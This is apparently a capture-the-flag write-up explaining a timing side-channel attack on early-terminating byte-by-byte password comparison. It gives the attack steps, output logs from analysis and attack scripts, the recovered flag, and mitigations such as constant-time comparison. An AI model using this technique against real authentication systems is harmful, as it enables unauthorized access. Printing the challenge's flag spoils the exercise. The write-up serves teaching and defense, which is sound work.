# Gatekeeper1 - Timing Side-Channel Attack

## Vulnerability Analysis

This challenge demonstrates a **timing side-channel vulnerability** in password verification. The target device uses a byte-by-byte comparison that terminates early when a mismatch is found, creating measurable timing differences.

### Attack Strategy

1. **Timing Measurement**: For each character position, we test all possible characters and measure response times
2. **Statistical Analysis**: Multiple samples are collected and the median timing is used to reduce noise
3. **Character Detection**: The character that produces the longest execution time is the correct one (comparison continues further)
4. **Iterative Recovery**: Each character is recovered sequentially, building the complete password

### Analysis Output

The `analysis.py` script performs timing analysis on the first few positions to demonstrate the vulnerability:

```
=== timing side-channel analysis ===

vulnerability: byte-by-byte password comparison
attack vector: timing differences reveal correct characters

analyzing position 0...
position 0: detected timing anomaly for 'g'
current prefix: g

analyzing position 1...
position 1: detected timing anomaly for 'k'
current prefix: gk

analyzing position 2...
position 2: detected timing anomaly for '1'
current prefix: gk1

=== analysis complete ===
timing side-channel confirmed for first 3 bytes
detected prefix: gk1
```

The analysis generates timing distribution plots showing the measurable differences between correct and incorrect character guesses.

## Attack Execution

Running `attack.py` performs the complete password recovery:

```
programming done
position 0: guessed 'g'
position 1: guessed 'k'
position 2: guessed '1'
position 3: guessed '{'
position 4: guessed 'l'
position 5: guessed '0'
position 6: guessed 'g'
position 7: guessed '1'
position 8: guessed 'n'
position 9: guessed 'p'
position 10: guessed 'w'
position 11: guessed 'n'
position 12: guessed '}'
guessed password: gk1{l0g1npwn}
```

## Flag

**gk1{l0g1npwn}**

## Mitigation

To prevent timing side-channel attacks:
- Use constant-time comparison functions
- Avoid early termination in security-critical comparisons
- Implement proper password hashing (bcrypt, scrypt, Argon2)
